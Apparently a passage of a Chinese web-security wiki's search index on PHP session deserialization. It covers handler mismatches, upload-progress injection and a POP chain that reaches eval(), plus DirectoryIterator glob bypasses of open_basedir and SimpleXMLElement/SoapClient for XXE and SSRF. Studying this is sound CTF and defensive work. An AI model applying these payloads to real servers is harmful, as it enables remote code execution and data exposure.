<p>php_binary:\u5b58\u50a8\u65b9\u5f0f\u662f\uff0c\u952e\u540d\u7684\u957f\u5ea6\u5bf9\u5e94\u7684ASCII\u5b57\u7b26+\u952e\u540d+\u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684\u503c</p> <ul> <li> <p>php:\u5b58\u50a8\u65b9\u5f0f\u662f\uff0c\u952e\u540d+\u7ad6\u7ebf+\u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5904\u7406\u7684\u503c</p> </li> <li> <p>php_serialize(php&gt;5.5.4):\u5b58\u50a8\u65b9\u5f0f\u662f\uff0c\u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684\u503c</p> </li> <li> <p>\u5728PHP\u4e2d\u9ed8\u8ba4\u4f7f\u7528\u7684\u662fPHP\u5f15\u64ce\uff0c\u5982\u679c\u8981\u4fee\u6539\u4e3a\u5176\u4ed6\u7684\u5f15\u64ce\uff0c\u53ea\u9700\u8981\u6dfb\u52a0\u4ee3\u7801<code>ini_set('session.serialize_handler', '\u9700\u8981\u8bbe\u7f6e\u7684\u5f15\u64ce');</code></p> </li> </ul> <pre><code>&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();// do something\nPlain Text\n</code></pre> <p>php\u4e2d\u7684session\u4e2d\u7684\u5185\u5bb9\u5e76\u4e0d\u662f\u653e\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u800c\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u6765\u5b58\u50a8\u7684\uff0c\u5b58\u50a8\u65b9\u5f0f\u5c31\u662f\u7531\u914d\u7f6e\u9879<code>session.save_handler</code>\u6765\u8fdb\u884c\u786e\u5b9a\u7684\uff0c\u9ed8\u8ba4\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8\u3002</p> <p>\u5b58\u50a8\u7684\u6587\u4ef6\u662f\u4ee5<code>sess_sessionid</code>\u6765\u8fdb\u884c\u547d\u540d\u7684\uff0c\u6587\u4ef6\u7684\u5185\u5bb9\u5c31\u662fsession\u503c\u7684\u5e8f\u5217\u8bdd\u4e4b\u540e\u7684\u5185\u5bb9\u3002</p> <p>\u5047\u8bbe\u6211\u4eec\u7684\u73af\u5883\u662fxampp\uff0c\u90a3\u4e48\u9ed8\u8ba4\u914d\u7f6e\u5982\u4e0a\u6240\u8ff0\u3002</p> <p>\u5728\u9ed8\u8ba4\u914d\u7f6e\u60c5\u51b5\u4e0b\uff1a</p> <pre><code>&lt;?phpsession_start()$_SESSION['name'] = 'spoock';var_dump();?&gt;\nPlain Text\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230PHPSESSID\u7684\u503c\u662f<code>jo86ud4jfvu81mbg28sl2s56c2</code>\uff0c\u800c\u5728<code>xampp/tmp</code>\u4e0b\u5b58\u50a8\u7684\u6587\u4ef6\u540d\u662f<code>sess_jo86ud4jfvu81mbg28sl2s56c2</code>\uff0c\u6587\u4ef6\u7684\u5185\u5bb9\u662f<code>name|s:6:\"spoock\";</code>\u3002name\u662f\u952e\u503c\uff0c<code>s:6:\"spoock\";</code>\u662f<code>serialize(\"spoock\")</code>\u7684\u7ed3\u679c\u3002</p> <p>\u5728php_serialize\u5f15\u64ce\u4e0b\uff1a</p> <pre><code>&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();$_SESSION['name'] = 'spoock';var_dump();?&gt;\nPlain Text\n</code></pre> <p>SESSION\u6587\u4ef6\u7684\u5185\u5bb9\u662f<code>a:1:{s:4:\"name\";s:6:\"spoock\";}</code>\u3002<code>a:1</code>\u662f\u4f7f\u7528php_serialize\u8fdb\u884c\u5e8f\u5217\u8bdd\u90fd\u4f1a\u52a0\u4e0a\u3002\u540c\u65f6\u4f7f\u7528php_serialize\u4f1a\u5c06session\u4e2d\u7684key\u548cvalue\u90fd\u4f1a\u8fdb\u884c\u5e8f\u5217\u5316\u3002</p> <p>\u5728php_binary\u5f15\u64ce\u4e0b\uff1a</p> <pre><code>&lt;?phpini_set('session.serialize_handler', 'php_binary');session_start();$_SESSION['name'] = 'spoock';var_dump();?&gt;\nPlain Text\n</code></pre> <p>SESSION\u6587\u4ef6\u7684\u5185\u5bb9\u662f<code>names:6:\"spoock\";</code>\u3002\u7531\u4e8e<code>name</code>\u7684\u957f\u5ea6\u662f4\uff0c4\u5728ASCII\u8868\u4e2d\u5bf9\u5e94\u7684\u5c31\u662f<code>EOT</code>\u3002\u6839\u636ephp_binary\u7684\u5b58\u50a8\u89c4\u5219\uff0c\u6700\u540e\u5c31\u662f<code>names:6:\"spoock\";</code>\u3002</p> <p>\u4ee5\u4e0a\u4e3a\u9884\u5907\u77e5\u8bc6</p> <p>PHP\u4e2d\u7684Session\u7684\u5b9e\u73b0\u662f\u6ca1\u6709\u7684\u95ee\u9898\uff0c\u5371\u5bb3\u4e3b\u8981\u662f\u7531\u4e8e\u7a0b\u5e8f\u5458\u7684Session\u4f7f\u7528\u4e0d\u5f53\u800c\u5f15\u8d77\u7684\u3002</p> <p>\u5982\u679c\u5728PHP\u5728\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684$_SESSION\u6570\u636e\u65f6\u4f7f\u7528\u7684\u5f15\u64ce\u548c\u5e8f\u5217\u5316\u4f7f\u7528\u7684\u5f15\u64ce\u4e0d\u4e00\u6837\uff0c\u4f1a\u5bfc\u81f4\u6570\u636e\u65e0\u6cd5\u6b63\u786e\u7684\u53cd\u5e8f\u5217\u5316\u3002\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u6570\u636e\u5305\uff0c\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u7a0b\u5e8f\u7684\u9a8c\u8bc1\u6216\u8005\u662f\u6267\u884c\u4e00\u4e9b\u7cfb\u7edf\u7684\u65b9\u6cd5\u3002</p> <pre><code>$_SESSION['ryat'] = '|O:11:\"PeopleClass\":0:{}';\nPlain Text\n</code></pre> <p>\u4e0a\u8ff0\u7684$_SESSION\u7684\u6570\u636e\u4f7f\u7528<code>php_serialize</code>\uff0c\u90a3\u4e48\u6700\u540e\u7684\u5b58\u50a8\u7684\u5185\u5bb9\u5c31\u662f<code>a:1:{s:6:\"spoock\";s:24:\"|O:11:\"PeopleClass\":0:{}\";}</code>\u3002</p> <p>\u4f46\u662f\u670d\u52a1\u5668\u5728\u8fdb\u884c\u8bfb\u53d6\u7684\u65f6\u5019\uff0c\u9ed8\u8ba4\u9009\u62e9\u7684\u662f<code>php</code>\uff0c\u90a3\u4e48\u6700\u540e\u8bfb\u53d6\u7684\u5185\u5bb9\u662f:</p> <pre><code>array (size=1)\n  'a:1:{s:6:\"spoock\";s:24:\"' =&gt; \n    object(__PHP_Incomplete_Class)[1]\n      public '__PHP_Incomplete_Class_Name' =&gt; string 'PeopleClass' (length=11)\nPlain Text\n</code></pre> <p>\u8fd9\u662f\u56e0\u4e3a\u5f53\u4f7f\u7528php\u5f15\u64ce\u7684\u65f6\u5019\uff0cphp\u5f15\u64ce\u4f1a\u4ee5|\u4f5c\u4e3a\u4f5c\u4e3akey\u548cvalue\u7684\u5206\u9694\u7b26\uff0c\u90a3\u4e48\u5c31\u4f1a\u5c06<code>a:1:{s:6:\"spoock\";s:24:\"</code>\u4f5c\u4e3aSESSION\u7684key\uff0c\u5c06<code>O:11:\"PeopleClass\":0:{}</code>\u4f5c\u4e3avalue\uff0c\u7136\u540e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u6700\u540e\u5c31\u4f1a\u5f97\u5230PeopleClas\u8fd9\u4e2a\u7c7b\u3002\u8fd9\u79cd\u7531\u4e8e\u5e8f\u5217\u8bdd\u5316\u548c\u53cd\u5e8f\u5217\u5316\u6240\u4f7f\u7528\u7684\u4e0d\u4e00\u6837\u7684\u5f15\u64ce\u5c31\u662f\u9020\u6210PHP Session\u5e8f\u5217\u8bdd\u6f0f\u6d1e\u7684\u539f\u56e0\u3002</p> <p>\u4e0b\u9762\u7684\u6458\u81ea\u67d0\u4e2a\u535a\u5ba2\uff1a</p>"},{"location":"web/serialize/PHP/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B7%B3%E6%9D%BF/#session_start","title":"session_start()","text":"<p>\u9996\u5148\u8bbf\u95ee1.php\uff0c\u5728\u4f20\u5165\u7684\u53c2\u6570\u6700\u5f00\u59cb\u52a0\u4e00\u4e2a'|'\uff0c\u7531\u4e8e1.php\u662f\u4f7f\u7528php_serialize\u5f15\u64ce\u5904\u7406\uff0c\u56e0\u6b64\u53ea\u4f1a\u628a'|'\u5f53\u505a\u4e00\u4e2a\u6b63\u5e38\u7684\u5b57\u7b26\u3002\u7136\u540e\u8bbf\u95ee2.php\uff0c\u7531\u4e8e\u7528\u7684\u662fphp\u5f15\u64ce\uff0c\u56e0\u6b64\u9047\u5230'|'\u65f6\u4f1a\u5c06\u4e4b\u770b\u505a\u952e\u540d\u4e0e\u503c\u7684\u5206\u5272\u7b26\uff0c\u4ece\u800c\u9020\u6210\u4e86\u6b67\u4e49\uff0c\u5bfc\u81f4\u5176\u5728\u89e3\u6790session\u6587\u4ef6\u65f6\u76f4\u63a5\u5bf9'|'\u540e\u7684\u503c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\u3002</p> <p>\u8fd9\u91cc\u53ef\u80fd\u4f1a\u6709\u4e00\u4e2a\u5c0f\u7591\u95ee\uff0c\u4e3a\u4ec0\u4e48\u5728\u89e3\u6790session\u6587\u4ef6\u65f6\u76f4\u63a5\u5bf9'|'\u540e\u7684\u503c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\uff0c\u8fd9\u4e5f\u662f\u5904\u7406\u5668\u7684\u529f\u80fd\uff1f\u8fd9\u4e2a\u5176\u5b9e\u662f\u56e0\u4e3asession_start()\u8fd9\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u770b\u4e0b\u5b98\u65b9\u8bf4\u660e\uff1a</p> <p></p> <pre><code>&lt;?php   class student{      var $name;      var $age;   }   $a = new student(); $a-&gt;nage =  \"hacker\";   $a-&gt;age = \"1111\";   echo serialize($a);\nPlain Text\n</code></pre> <p></p> <p>\u653b\u51fb\u601d\u8def\u4e2d\u8bf4\u5230\u4e86\u56e0\u4e3a\u4e0d\u540c\u7684\u5f15\u64ce\u4f1a\u5bf9<code>'|'</code>\uff0c\u4ea7\u751f\u6b67\u4e49\uff0c\u6240\u4ee5\u5728\u4f20\u53c2\u65f6\u5728payload\u524d\u52a0\u4e2a<code>'|'</code>\uff0c\u4f5c\u4e3aa\u53c2\u6570\uff0c\u8bbf\u95ee<code>1.php</code>,\u67e5\u770b\u4e00\u4e0b\u672c\u5730session\u6587\u4ef6\uff0c\u53d1\u73b0payload\u5df2\u7ecf\u5b58\u5165\u5230<code>session</code>\u6587\u4ef6</p> <p></p> <p><code>php_serialize</code>\u5f15\u64ce\u4f20\u5165\u7684payload\u4f5c\u4e3alemon\u5bf9\u5e94\u503c\uff0c\u800c<code>php</code>\u5219\u5b8c\u5168\u4e0d\u4e00\u6837\uff1a</p> <p></p> <p>\u8bbf\u95ee\u4e00\u4e0b2.php</p> <p></p> <p>OVER</p>"},{"location":"web/serialize/PHP/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B7%B3%E6%9D%BF/#session_upload_process","title":"session_upload_process","text":"<p>\u5728<code>PHP</code>\u4e2d\u8fd8\u5b58\u5728\u4e00\u4e2a<code>upload_process</code>\u673a\u5236\uff0c\u5373\u81ea\u52a8\u5728<code>$_SESSION</code>\u4e2d\u521b\u5efa\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u503c\u4e2d\u521a\u597d\u5b58\u5728\u7528\u6237\u53ef\u63a7\u7684\u90e8\u5206\uff0c\u53ef\u4ee5\u770b\u4e0b\u5b98\u65b9\u63cf\u8ff0\u7684\uff0c\u8fd9\u4e2a\u529f\u80fd\u5728\u6587\u4ef6\u4e0a\u4f20\u7684\u8fc7\u7a0b\u4e2d\u5229\u7528<code>session</code>\u5b9e\u65f6\u8fd4\u56de\u4e0a\u4f20\u7684\u8fdb\u5ea6\u3002</p> <p></p> <p>\u8fd9\u91cc\u9700\u8981\u5148\u4e0a\u4f20\u6587\u4ef6\uff0c\u540c\u65f6POST\u4e00\u4e2a\u4e0esession.upload_process.name\u7684\u540c\u540d\u53d8\u91cf\u3002\u540e\u7aef\u4f1a\u81ea\u52a8\u5c06POST\u7684\u8fd9\u4e2a\u540c\u540d\u53d8\u91cf\u4f5c\u4e3a\u952e\u8fdb\u884c\u5e8f\u5217\u5316\u7136\u540e\u5b58\u50a8\u5230session\u6587\u4ef6\u4e2d\u3002\u4e0b\u6b21\u8bf7\u6c42\u5c31\u4f1a\u53cd\u5e8f\u5217\u5316session\u6587\u4ef6\uff0c\u4ece\u4e2d\u53d6\u51fa\u8fd9\u4e2a\u952e\u3002\u6240\u4ee5\u653b\u51fb\u70b9\u8fd8\u662f\u8ddf\u4e0a\u4e00\u90e8\u5206\u4e00\u6a21\u4e00\u6837\uff0c\u7a0b\u5e8f\u8fd8\u662f\u4f7f\u7528\u4e86\u4e0d\u540c\u7684session\u5904\u7406\u5f15\u64ce\u3002</p> <p>\u901a\u8fc7<code>POST</code>\u65b9\u6cd5\u6765\u6784\u9020\u6570\u636e\u4f20\u5165<code>$_SESSION</code></p> <pre><code>&lt;form action=\"http://web.jarvisoj.com:32784/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n    &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /&gt;\n    &lt;input type=\"file\" name=\"file\" /&gt;\n    &lt;input type=\"submit\" /&gt;\n&lt;/form&gt;//\u5176\u5b9e\u8fd9\u91cc\u7684\u610f\u601d\u662f\uff0c\u6211\u4eec\u81ea\u5df1\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u7f51\u9875\uff0c\u7136\u540e\u5411web\u7aef\u63d0\u4ea4\u6570\u636e\uff0c\u8fd9\u4e2a\u63d0\u4ea4\u540c\u65f6\u5305\u542b\u4e86post\u548cupload\u3002\u7136\u540e\u6211\u4eec\u63d0\u4ea4\u53cd\u5e8f\u5217\u5316\u7684\u6570\u636e\uff0c\u7531\u4e8euplaod_process\u4f1a\u81ea\u52a8\u6dfb\u52a0\u6570\u636e\u5230$_session\u4e2d\uff0c\u800c$_session\u4e2d\u7684\u6570\u636e\u53c8\u4f1a\u81ea\u5df1\u53cd\u5e8f\u5217\u5316\uff08\u7528php\u7684\u65b9\u6cd5\uff09\u6784\u6790\u540e\u5c31\u76f8\u5f53\u4e8eunserilize\u51fd\u6570\u4e86\u3002\nPlain Text\n</code></pre> <p>\u8fd9\u4e2asession\u770b\u4e0d\u61c2\u7684\u8bdd\u5efa\u8bae\u81ea\u5df1\u591a\u591a\u627e\u8d44\u6599\u4e86\u89e3\u4e00\u4e0b\uff0c\u56e0\u4e3a\u786e\u5b9e\u6709\u70b9\u96be\u3002</p>"},{"location":"web/serialize/PHP/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B7%B3%E6%9D%BF/#_1","title":"\u4e3e\u4f8b\uff08\u4f8b\u9898\uff09","text":"<pre><code>&lt;?php\nhighlight_string(file_get_contents(basename($_SERVER['PHP_SELF'])));\n//show_source(__FILE__);\nclass foo1{\npublic $varr;\nfunction __construct(){\n$this-&gt;varr = \"index.php\";\n}\nfunction __destruct(){\nif(file_exists($this-&gt;varr)){\necho \"&lt;br&gt;\u6587\u4ef6\".$this-&gt;varr.\"\u5b58\u5728&lt;br&gt;\";\n}\necho \"&lt;br&gt;\u8fd9\u662ffoo1\u7684\u6790\u6784\u51fd\u6570&lt;br&gt;\";\n}\n}\nclass foo2{\npublic $varr;\npublic $obj;\nfunction __construct(){\n$this-&gt;varr = '1234567890';\n$this-&gt;obj = null;\n}\nfunction __toString(){\n$this-&gt;obj-&gt;execute();\nreturn $this-&gt;varr;\n}\nfunction __desctuct(){\necho \"&lt;br&gt;\u8fd9\u662ffoo2\u7684\u6790\u6784\u51fd\u6570&lt;br&gt;\";\n}\n}\nclass foo3{\npublic $varr;\nfunction execute(){\neval($this-&gt;varr);\n}\nfunction __desctuct(){\necho \"&lt;br&gt;\u8fd9\u662ffoo3\u7684\u6790\u6784\u51fd\u6570&lt;br&gt;\";\n}\n}\n?&gt;\nPlain Text\n</code></pre> <p>index.php</p> <pre><code>&lt;?php\nini_set('session.serialize_handler', 'php');\nrequire(\"./class.php\");\nsession_start();\n$obj = new foo1();\n$obj-&gt;varr = \"phpinfo.php\";\n?&gt;\nPlain Text\n</code></pre> <p>\u901a\u8fc7\u4ee3\u7801\u53d1\u73b0\uff0c\u6211\u4eec\u6700\u7ec8\u662f\u8981\u901a\u8fc7foo3\u4e2d\u7684execute\u6765\u6267\u884c\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u3002</p> <p>\u6784\u9020\uff1a</p> <pre><code>&lt;?php\nclass foo3{\n        public $varr='echo \"spoock\";';\n        function execute(){\n                eval($this-&gt;varr);\n        }\n}\nclass foo2{\n        public $varr;\n        public $obj;\n        function __construct(){\n                $this-&gt;varr = '1234567890';\n                $this-&gt;obj = new foo3();\n        }\n        function __toString(){\n                $this-&gt;obj-&gt;execute();\n                return $this-&gt;varr;\n        }\n}\n\nclass foo1{\n        public $varr;\n        function __construct(){\n                $this-&gt;varr = new foo2();\n        }\n}\n\n\n$obj = new foo1();\nprint_r(serialize($obj));\n?&gt;\n</code></pre> <p>\u5199\u5165\u7684\u65b9\u5f0f\u4e3b\u8981\u662f\u5229\u7528PHP\u4e2dSession Upload Progress\u6765\u8fdb\u884c\u8bbe\u7f6e\uff0c\u5177\u4f53\u4e3a\uff0c\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u5982\u679cPOST\u4e00\u4e2a\u540d\u4e3aPHP_SESSION_UPLOAD_PROGRESS\u7684\u53d8\u91cf\uff0c\u5c31\u53ef\u4ee5\u5c06filename\u7684\u503c\u8d4b\u503c\u5230session\u4e2d</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/DirectoryIterator/","title":"DirectoryIterator","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7528\u4e8e\u67e5\u770b\u6587\u4ef6\u7cfb\u7edf\u76ee\u5f55\u5185\u5bb9\u7684\u7b80\u5355\u63a5\u53e3\uff0c\u8be5\u7c7b\u662f\u5728 PHP 5 \u4e2d\u589e\u52a0\u7684\u4e00\u4e2a\u7c7b\u3002</p> <p>DirectoryIterator\u4e0eglob://\u534f\u8bae\u7ed3\u5408\u5c06\u65e0\u89c6open_basedir\u5bf9\u76ee\u5f55\u7684\u9650\u5236\uff0c\u53ef\u4ee5\u7528\u6765\u5217\u4e3e\u51fa\u6307\u5b9a\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002</p> <pre><code>test.php&lt;?php$dir\u00a0=\u00a0$_GET['whoami'];$a\u00a0=\u00a0new\u00a0DirectoryIterator($dir);foreach($a\u00a0as\u00a0$f)    {\u00a0\u00a0\u00a0\u00a0 echo($f-&gt;__toString().'&lt;br&gt;');}?&gt;\u00a0\u00a0\u00a0\u00a0#\u00a0payload\u4e00\u53e5\u8bdd\u7684\u5f62\u5f0f:$a\u00a0=\u00a0new\u00a0DirectoryIterator(\"glob:///*\");foreach($a\u00a0as\u00a0$f){echo($f-&gt;__toString().'&lt;br&gt;');}?&gt;\nPlain Text\n</code></pre> <p>\u6211\u4eec\u8f93\u5165<code>/?whoami=glob:///*</code>\u5373\u53ef\u5217\u51fa\u6839\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff1a\u4f46\u662f\u4f1a\u53d1\u73b0\u53ea\u80fd\u5217\u6839\u76ee\u5f55\u548copen_basedir\u6307\u5b9a\u7684\u76ee\u5f55\u7684\u6587\u4ef6\uff0c\u4e0d\u80fd\u5217\u51fa\u9664\u524d\u9762\u7684\u76ee\u5f55\u4ee5\u5916\u7684\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\uff0c\u4e14\u4e0d\u80fd\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002</p> <p>\u4f46\u662f\u7ecf\u8fc7\u79ef\u7d2f\uff0c\u8fd8\u662f\u6709\u7c7b\u80fd\u591f\u8bfb\u5230\u6587\u4ef6\uff08\u89c1\u5176\u4ed6\uff09</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SimpleXMLElement/","title":"SimpleXMLElement","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u8fd9\u4e2a\u5185\u7f6e\u7c7b\u7528\u4e8e\u89e3\u6790 XML \u6587\u6863\u4e2d\u7684\u5143\u7d20</p> <p></p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u901a\u8fc7\u8bbe\u7f6e\u7b2c\u4e09\u4e2a\u53c2\u6570 data_is_url \u4e3a<code>true</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u8fdc\u7a0bxml\u6587\u4ef6\u7684\u8f7d\u5165\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u5e38\u91cf\u503c\u6211\u4eec\u8bbe\u7f6e\u4e3a<code>2</code>\u5373\u53ef\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570 data \u5c31\u662f\u6211\u4eec\u81ea\u5df1\u8bbe\u7f6e\u7684payload\u7684url\u5730\u5740\uff0c\u5373\u7528\u4e8e\u5f15\u5165\u7684\u5916\u90e8\u5b9e\u4f53\u7684url\u3002</p> <p>\u8fd9\u6837\u7684\u8bdd\uff0c\u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u76ee\u6807\u8c03\u7528\u7684\u7c7b\u7684\u65f6\u5019\uff0c\u4fbf\u53ef\u4ee5\u901a\u8fc7 SimpleXMLElement \u8fd9\u4e2a\u5185\u7f6e\u7c7b\u6765\u6784\u9020 XXE(\u8fd9\u4e2a\u4e5f\u53ef\u4ee5\u6253\u5185\u7f51\uff0c\u4f46\u662f\u6211\u78b0\u5230\u7684\u5f88\u5c11\uff0c\u7b49\u5f85\u540e\u7eed\u8865\u5145)\u3002</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/","title":"SoapClient","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/#_1","title":"\u57fa\u7840","text":"<p>\u8fd9\u4e2a\u7c7b\u5229\u7528\u8d77\u6765\u6bd4\u8f83\u8003\u9a8c\u6280\u5de7\u4e86\uff0c\u800c\u4e14\u7531\u4e8e\u78b0\u5230\u7684\u7f51\u7edc\u73af\u5883\u4e0d\u4f1a\u5f88\u7a33\u5b9a\uff0c\u53ef\u80fd\u8981\u91cd\u590d\u8bd5\u5f88\u591a\u6b21\u624d\u80fd\u8bd5\u51fa\u6765\u3002\u800c\u4e14\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e2a\u7c7b\u7684\u8fd0\u7528\u91cd\u70b9\u4e0d\u5728\u53cd\u5e8f\u5217\u5316\u4e0a\u3002</p> <p><code>SOAP</code>:<code>Simple Object Access Protocol</code>\u7b80\u5355\u5bf9\u8c61\u8bbf\u95ee\u534f\u8bae</p> <p>PHP \u7684\u5185\u7f6e\u7c7b SoapClient \u662f\u4e00\u4e2a\u4e13\u95e8\u7528\u6765\u8bbf\u95eeweb\u670d\u52a1\u7684\u7c7b\uff0c\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u57fa\u4e8eSOAP\u534f\u8bae\u8bbf\u95eeWeb\u670d\u52a1\u7684 PHP \u5ba2\u6237\u7aef\u3002</p> <p>\u5f00\u542f\u6761\u4ef6\uff1a\u9700\u8981\u5c06php.ini\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6soap.dll\u4e4b\u524d\u7684\u5206\u53f7\u53bb\u6389\u624d\u80fd\u591f\u4f7f\u7528\u3002</p> <pre><code>SoapClient\u00a0{\u00a0/*\u00a0\u65b9\u6cd5\u00a0*/\u00a0public\u00a0__construct\u00a0(\u00a0string|null\u00a0$wsdl\u00a0,\u00a0array\u00a0$options\u00a0=\u00a0[]\u00a0)\u00a0public\u00a0__call\u00a0(\u00a0string\u00a0$name\u00a0,\u00a0array\u00a0$args\u00a0)\u00a0:\u00a0mixed\u00a0public\u00a0__doRequest\u00a0(\u00a0string\u00a0$request\u00a0,\u00a0string\u00a0$location\u00a0,\u00a0string\u00a0$action\u00a0,\u00a0int\u00a0$version\u00a0,\u00a0bool\u00a0$oneWay\u00a0=\u00a0false\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getCookies\u00a0(\u00a0)\u00a0:\u00a0array\u00a0public\u00a0__getFunctions\u00a0(\u00a0)\u00a0:\u00a0array|null\u00a0public\u00a0__getLastRequest\u00a0(\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getLastRequestHeaders\u00a0(\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getLastResponse\u00a0(\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getLastResponseHeaders\u00a0(\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getTypes\u00a0(\u00a0)\u00a0:\u00a0array|null\u00a0public\u00a0__setCookie\u00a0(\u00a0string\u00a0$name\u00a0,\u00a0string|null\u00a0$value\u00a0=\u00a0null\u00a0)\u00a0:\u00a0void\u00a0public\u00a0__setLocation\u00a0(\u00a0string\u00a0$location\u00a0=\u00a0\"\"\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__setSoapHeaders\u00a0(\u00a0SoapHeader|array|null\u00a0$headers\u00a0=\u00a0null\u00a0)\u00a0:\u00a0bool\u00a0public\u00a0__soapCall\u00a0(\u00a0string\u00a0$name\u00a0,\u00a0array\u00a0$args\u00a0,\u00a0array|null\u00a0$options\u00a0=\u00a0null\u00a0,\u00a0SoapHeader|array|null\u00a0$inputHeaders\u00a0=\u00a0null\u00a0,\u00a0array\u00a0&amp;$outputHeaders\u00a0=\u00a0null\u00a0)\u00a0:\u00a0mixed}\nPlain Text\n</code></pre> <p>\u6211\u5077\u61d2\u4e86\uff0c\u91cd\u70b9\u5173\u6ce8\u7684\u662f\u8fd9\u91cc\u7684\u7b2c\u4e8c\u884c__call(\u8c03\u7528\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u51fd\u6570\uff0c\u4f1a\u53bb\u8c03\u7528<code>__call</code>\u65b9\u6cd5).\u5f53<code>__call</code>\u65b9\u6cd5\u88ab\u89e6\u53d1\u540e\uff0c\u5b83\u53ef\u4ee5\u53d1\u9001 HTTP \u548c HTTPS \u8bf7\u6c42\u3002\u6b63\u662f\u8fd9\u4e2a<code>__call</code>\u65b9\u6cd5\uff0c\u4f7f\u5f97 SoapClient \u7c7b\u53ef\u4ee5\u88ab\u6211\u4eec\u8fd0\u7528\u5728 SSRF \u4e2d\u3002</p> <pre><code>public\u00a0SoapClient\u00a0::\u00a0SoapClient(mixed\u00a0$wsdl\u00a0[\uff0carray\u00a0$options\u00a0])\nPlain Text\n</code></pre> <ul> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u7528\u6765\u6307\u660e\u662f\u5426\u662fwsdl\u6a21\u5f0f\uff0c\u5c06\u8be5\u503c\u8bbe\u4e3anull\u5219\u8868\u793a\u975ewsdl\u6a21\u5f0f\u3002</li> <li>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u4e00\u4e2a\u6570\u7ec4\uff0c\u5982\u679c\u5728wsdl\u6a21\u5f0f\u4e0b\uff0c\u6b64\u53c2\u6570\u53ef\u9009\uff1b\u5982\u679c\u5728\u975ewsdl\u6a21\u5f0f\u4e0b\uff0c\u5219\u5fc5\u987b\u8bbe\u7f6elocation\u548curi\u9009\u9879\uff0c\u5176\u4e2dlocation\u662f\u8981\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u7684SOAP\u670d\u52a1\u5668\u7684URL\uff0c\u800curi \u662fSOAP\u670d\u52a1\u7684\u76ee\u6807\u547d\u540d\u7a7a\u95f4\u3002</li> </ul> <p>SOAP\u662fwebService\u4e09\u8981\u7d20\uff08SOAP\u3001WSDL\u3001UDDI\uff09\u4e4b\u4e00\uff1a</p> <p>WSDL \u7528\u6765\u63cf\u8ff0\u5982\u4f55\u8bbf\u95ee\u5177\u4f53\u7684\u63a5\u53e3\u3002</p> <p>UDDI\u7528\u6765\u7ba1\u7406\uff0c\u5206\u53d1\uff0c\u67e5\u8be2webService\u3002</p> <p>SOAP\uff08\u7b80\u5355\u5bf9\u8c61\u8bbf\u95ee\u534f\u8bae\uff09\u662f\u8fde\u63a5\u6216Web\u670d\u52a1\u6216\u5ba2\u6237\u7aef\u548cWeb\u670d\u52a1\u4e4b\u95f4\u7684\u63a5\u53e3\u3002</p> 